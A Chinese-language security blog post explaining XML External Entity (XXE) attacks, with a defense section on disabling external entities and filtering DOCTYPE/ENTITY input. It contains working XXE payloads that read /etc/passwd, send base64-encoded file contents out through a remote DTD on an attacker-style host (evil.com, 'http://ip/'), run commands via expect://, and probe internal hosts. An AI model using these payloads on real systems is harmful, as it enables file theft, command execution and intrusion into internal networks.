<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>XML External Entity(XXE) | 0kami&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="0x00 描述XML的一些基础知识，摘自security.tencent.comXML例子1234567891011121314&amp;lt;?xml version=&quot;1.0&quot; ?&amp;gt;  xml声明&amp;lt;!DOCTYPE note[   文档类型定义	&amp;lt;!ELEMENT note (to,from,heading,body)&amp;gt;	&amp;lt;!ELEMENT to   (#PCDATA)&amp;">
<meta property="og:type" content="article">
<meta property="og:title" content="XML External Entity(XXE)">
<meta property="og:url" content="http://yoursite.com/2016/06/28/xxe/index.html">
<meta property="og:site_name" content="0kami's Blog">
<meta property="og:description" content="0x00 描述XML的一些基础知识，摘自security.tencent.comXML例子1234567891011121314&amp;lt;?xml version=&quot;1.0&quot; ?&amp;gt;  xml声明&amp;lt;!DOCTYPE note[   文档类型定义	&amp;lt;!ELEMENT note (to,from,heading,body)&amp;gt;	&amp;lt;!ELEMENT to   (#PCDATA)&amp;">
<meta property="og:updated_time" content="2016-07-04T03:14:31.030Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="XML External Entity(XXE)">
<meta name="twitter:description" content="0x00 描述XML的一些基础知识，摘自security.tencent.comXML例子1234567891011121314&amp;lt;?xml version=&quot;1.0&quot; ?&amp;gt;  xml声明&amp;lt;!DOCTYPE note[   文档类型定义	&amp;lt;!ELEMENT note (to,from,heading,body)&amp;gt;	&amp;lt;!ELEMENT to   (#PCDATA)&amp;">
  
    <link rel="alternative" href="/atom.xml" title="0kami&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/favicon.jpg">
  
  
  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
  
      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  
  <!-- 加载特效 -->
    <script src="/js/pace.js"></script>
    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
  <script>
      var yiliaConfig = {
          fancybox: true,
          animate: true,
          isHome: false,
          isPost: true,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            
            <img lazy-src="/img/head.jpg" class="js-avatar">
            
        </a>

        <hgroup>
          <h1 class="header-author"><a href="/">0kami-zj9s</a></h1>
        </hgroup>

        
        
        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">Home</a></li>
                        
                            <li><a href="/categories/writeup">Writeup</a></li>
                        
                            <li><a href="/categories/webSec">WebSec</a></li>
                        
                            <li><a href="/categories/python">Python</a></li>
                        
                            <li><a href="/archives">Allpage</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fl mail" target="_blank" href="/gmfork@163.com" title="mail">mail</a>
                            
                                <a class="fl github" target="_blank" href="https://github.com/0kami" title="github">github</a>
                            
                                <a class="fl zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
                            
                                <a class="fl weibo" target="_blank" href="http://weibo.com/u/1015713383" title="weibo">weibo</a>
                            
                                <a class="fl google" target="_blank" href="#" title="google">google</a>
                            
                                <a class="fl twitter" target="_blank" href="#" title="twitter">twitter</a>
                            
                                <a class="fl facebook" target="_blank" href="#" title="facebook">facebook</a>
                            
                                <a class="fl rss" target="_blank" href="/atom.xml" title="rss">rss</a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <a href="/tags/bctf/" style="font-size: 10px;">bctf</a> <a href="/tags/flask/" style="font-size: 10px;">flask</a> <a href="/tags/webVul/" style="font-size: 20px;">webVul</a>
                    </div>
                </section>
                
                
                

                
                
                <section class="switch-part switch-part3">
                
                    <div id="js-aboutme">ZJGSU 0kami</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">0kami-zj9s</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img lazy-src="/img/head.jpg" class="js-avatar">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">0kami-zj9s</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">Home</a></li>
                
                    <li><a href="/categories/writeup">Writeup</a></li>
                
                    <li><a href="/categories/webSec">WebSec</a></li>
                
                    <li><a href="/categories/python">Python</a></li>
                
                    <li><a href="/archives">Allpage</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                <div class="social">
                    
                        <a class="mail" target="_blank" href="/gmfork@163.com" title="mail">mail</a>
                    
                        <a class="github" target="_blank" href="https://github.com/0kami" title="github">github</a>
                    
                        <a class="zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
                    
                        <a class="weibo" target="_blank" href="http://weibo.com/u/1015713383" title="weibo">weibo</a>
                    
                        <a class="google" target="_blank" href="#" title="google">google</a>
                    
                        <a class="twitter" target="_blank" href="#" title="twitter">twitter</a>
                    
                        <a class="facebook" target="_blank" href="#" title="facebook">facebook</a>
                    
                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
                    
                </div>
            </nav>
        </header>                
    </div>
</nav>
      <div class="body-wrap"><article id="post-xxe" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/06/28/xxe/" class="article-date">
      <time datetime="2016-06-28T08:33:43.000Z" itemprop="datePublished">2016-06-28</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      XML External Entity(XXE)
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/webSec/">webSec</a>
    </div>


        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/webVul/">webVul</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="0x00-描述"><a href="#0x00-描述" class="headerlink" title="0x00 描述"></a>0x00 描述</h2><p>XML的一些基础知识，摘自<a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">security.tencent.com</a><br>XML例子<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span>  xml声明</span><br><span class="line"><span class="meta">&lt;!DOCTYPE note[   文档类型定义</span><br><span class="line">	&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">	&lt;!ELEMENT to   (#PCDATA)&gt;</span><br><span class="line">	&lt;!ELEMENT from   (#PCDATA)&gt;</span><br><span class="line">	&lt;!ELEMENT heading   (#PCDATA)&gt;</span><br><span class="line">	&lt;!ELEMENT body   (#PCDATA)&gt;</span><br><span class="line">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span> 文档元素</span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>This is a Test<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>上述为一个XML的实例<br>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p>
<h5 id="内部声明DTD"><a href="#内部声明DTD" class="headerlink" title="内部声明DTD"></a>内部声明DTD</h5><p><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p>
<h5 id="引用外部DTD"><a href="#引用外部DTD" class="headerlink" title="引用外部DTD"></a>引用外部DTD</h5><p><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code>或者<code>&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</code><br>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
<h5 id="内部声明实体"><a href="#内部声明实体" class="headerlink" title="内部声明实体"></a>内部声明实体</h5><p><code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></p>
<h5 id="引用外部实体"><a href="#引用外部实体" class="headerlink" title="引用外部实体"></a>引用外部实体</h5><p><code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code>或者<code>&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></p>
<h5 id="漏洞描述摘自OWASP"><a href="#漏洞描述摘自OWASP" class="headerlink" title="漏洞描述摘自OWASP"></a>漏洞描述摘自<a href="https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing" target="_blank" rel="external">OWASP</a></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.</span><br></pre></td></tr></table></figure>
<p>漏洞成因为XML解析器配置不安全时，当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
<h2 id="0x01-试验"><a href="#0x01-试验" class="headerlink" title="0x01 试验"></a>0x01 试验</h2><p>恶意引入外部实体方式：<br>1.本地文件读取<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;</span><br><span class="line">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>2.远程文件读取<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY % d SYSTEM "http://evil.com/evil.dtd"&gt;</span><br><span class="line">	%d;</span><br><span class="line">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br><span class="line">其中evil.dtd文件内容</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">b</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>但是如果遇到读取多行的文件，可能会读不出来，这里可以看一下<a href="http://zone.wooyun.org/content/26651" target="_blank" rel="external">ftp接受xxe数据</a><br>不同的语言默认支持的协议不同</p>
<table>
<thead>
<tr>
<th>libxml2</th>
<th>php</th>
<th>java</th>
<th>.net</th>
</tr>
</thead>
<tbody>
<tr>
<td>file<br>http<br>ftp</td>
<td>file<br>http<br>ftp<br>php<br>compress.zip<br>compress.bzip2<br>data<br>glob<br>phar</td>
<td>http<br>https<br>ftp<br>file<br>jar<br>netdoc<br>mailto<br>gopher *</td>
<td>http<br>file<br>https<br>ftp</td>
</tr>
</tbody>
</table>
<p>上述为默认支持协议，还可以通过扩展支持其他协议，如php</p>
<table>
<thead>
<tr>
<th>scheme</th>
<th>extension required</th>
</tr>
</thead>
<tbody>
<tr>
<td>https<br>ftps</td>
<td>openssl</td>
</tr>
<tr>
<td>zip</td>
<td>zip</td>
</tr>
<tr>
<td>ssh2.shell<br>ssh2.exec<br>ssh2.tunnel<br>ssh2.sftp<br>ssh2.scp</td>
<td>ssh2</td>
</tr>
<tr>
<td>rar</td>
<td>rar</td>
</tr>
<tr>
<td>ogg</td>
<td>oggvorbis</td>
</tr>
<tr>
<td>expect</td>
<td>expect</td>
</tr>
</tbody>
</table>
<h5 id="demo1-任意读取本地文件"><a href="#demo1-任意读取本地文件" class="headerlink" title="demo1 任意读取本地文件"></a>demo1 任意读取本地文件</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br><span class="line">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br></pre></td></tr></table></figure>
<h5 id="demo2-不回显读取内容，远程传递数据"><a href="#demo2-不回显读取内容，远程传递数据" class="headerlink" title="demo2 不回显读取内容，远程传递数据"></a>demo2 不回显读取内容，远程传递数据</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/issue"&gt;</span><br><span class="line">	&lt;!ENTITY % dtd SYSTEM "http://ip/evil.dtd"&gt;</span><br><span class="line">	%dtd;</span><br><span class="line">	%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br><span class="line">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line">远程DTD文件内容</span><br><span class="line">&lt;!ENTITY % all <span class="string">"&lt;!ENTITY &amp;#x25 send SYSTEM 'http://ip/?xml=%file;'&gt;"</span>&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
<h5 id="demo3-执行系统命令"><a href="#demo3-执行系统命令" class="headerlink" title="demo3 执行系统命令"></a>demo3 执行系统命令</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY b SYSTEM "expect://id"&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br><span class="line">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br></pre></td></tr></table></figure>
<p>执行成功需要php的expect扩展</p>
<h5 id="demo4-探测内网应用"><a href="#demo4-探测内网应用" class="headerlink" title="demo4 探测内网应用"></a>demo4 探测内网应用</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY b SYSTEM "http://192.168.1.20:80"&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br><span class="line">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br></pre></td></tr></table></figure>
<p>如果不存在该ip的应用，会有warning failed to open stream，通过这种方式探测内容应用<br>同时如果找到了内容应用，可以通过这种方式攻击内网应用</p>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><h5 id="方案一、使用开发语言提供的禁用外部实体的方法"><a href="#方案一、使用开发语言提供的禁用外部实体的方法" class="headerlink" title="方案一、使用开发语言提供的禁用外部实体的方法"></a>方案一、使用开发语言提供的禁用外部实体的方法</h5><p>1.PHP：<br>libxml_disable_entity_loader(true);<br>2.JAVA:<br>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(false);<br>3.Python：<br>from lxml import etree<br>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p>
<h5 id="方案二、过滤用户提交的XML数据"><a href="#方案二、过滤用户提交的XML数据" class="headerlink" title="方案二、过滤用户提交的XML数据"></a>方案二、过滤用户提交的XML数据</h5><p>关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</p>
<h3 id="json节点的Content-Type-XXE攻击"><a href="#json节点的Content-Type-XXE攻击" class="headerlink" title="json节点的Content-Type XXE攻击"></a>json节点的Content-Type XXE攻击</h3><p>如今很多web应用程序使用的都是json格式的数据传递，通过在http request头中带入<code>Content-Type: application/json</code>表明传递的是json格式的数据。但是有时候服务器可以接受开发人员没有意料到的其他数据格式，如xml格式。如果服务器可以接受xml格式的数据，那么就有可能存在xxe。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line"></span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 38</span><br><span class="line"></span><br><span class="line">&#123;&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;&#125;</span><br><span class="line"></span><br><span class="line">HTTP Response:</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 43</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125;</span><br></pre></td></tr></table></figure></p>
<p>将如上的<code>Content-Type</code>改为xml格式的再发送<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line"></span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 112</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;search&gt;name&lt;/search&gt;</span><br><span class="line">&lt;value&gt;netspitest&lt;/value&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">HTTP Response:</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 43</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果返回的数据是一样的，那么就说明服务器可以接受xml格式的数据，那么我们就可以利用xxe来攻击<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line"></span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 288</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;search&gt;name&lt;/search&gt;</span><br><span class="line">&lt;value&gt;&amp;xxe;&lt;/value&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">HTTP Response:</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 2467</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync....</span><br></pre></td></tr></table></figure></p>
<p>但是并不是所有的json节点都是接受xml格式的数据的。有可能返回解析错误的提示或者415不支持媒体类型的错误消息</p>
<h4 id="带上一个xxe-cheat-sheet，DTD-Attacks"><a href="#带上一个xxe-cheat-sheet，DTD-Attacks" class="headerlink" title="带上一个xxe-cheat-sheet，DTD-Attacks"></a>带上一个<a href="http://web-in-security.blogspot.hk/2016/03/xxe-cheat-sheet.html" target="_blank" rel="external">xxe-cheat-sheet</a>，<a href="https://github.com/RUB-NDS/DTD-Attacks" target="_blank" rel="external">DTD-Attacks</a></h4><h3 id="参考security-tencent-com，91ri-org"><a href="#参考security-tencent-com，91ri-org" class="headerlink" title="参考security.tencent.com，91ri.org"></a>参考<a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">security.tencent.com</a>，<a href="https://www.91ri.org/12814.html" target="_blank" rel="external">91ri.org</a></h3>
      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2016/06/28/xxe/">XML External Entity(XXE)</a></p>
        <p><span>文章作者:</span><a href="/" title="访问 0kami-zj9s 的个人博客">0kami-zj9s</a></p>
        <p><span>发布时间:</span>2016年06月28日 - 16时33分</p>
        <p><span>最后更新:</span>2016年07月04日 - 11时14分</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="/2016/06/28/xxe/" title="XML External Entity(XXE)">http://yoursite.com/2016/06/28/xxe/</a>
            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2016/06/28/xxe/　　作者: 0kami-zj9s" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script src="/js/clipboard.min.js"></script>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



<nav id="article-nav">
  
    <a href="/2016/07/04/file-upload-vul/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption"><</strong>
      <div class="article-nav-title">
        
          文件上传学习总结
        
      </div>
    </a>
  
  
    <a href="/2016/03/20/Bctf-Crypto-SpecialRSA-writeup/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">Bctf Crypto SpecialRSA writeup</div>
      <strong class="article-nav-caption">></strong>
    </a>
  
</nav>

  
</article>

    <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-描述"><span class="toc-number">1.</span> <span class="toc-text">0x00 描述</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#内部声明DTD"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">内部声明DTD</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#引用外部DTD"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">引用外部DTD</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#内部声明实体"><span class="toc-number">1.0.0.3.</span> <span class="toc-text">内部声明实体</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#引用外部实体"><span class="toc-number">1.0.0.4.</span> <span class="toc-text">引用外部实体</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#漏洞描述摘自OWASP"><span class="toc-number">1.0.0.5.</span> <span class="toc-text">漏洞描述摘自OWASP</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-试验"><span class="toc-number">2.</span> <span class="toc-text">0x01 试验</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#demo1-任意读取本地文件"><span class="toc-number">2.0.0.1.</span> <span class="toc-text">demo1 任意读取本地文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#demo2-不回显读取内容，远程传递数据"><span class="toc-number">2.0.0.2.</span> <span class="toc-text">demo2 不回显读取内容，远程传递数据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#demo3-执行系统命令"><span class="toc-number">2.0.0.3.</span> <span class="toc-text">demo3 执行系统命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#demo4-探测内网应用"><span class="toc-number">2.0.0.4.</span> <span class="toc-text">demo4 探测内网应用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防御"><span 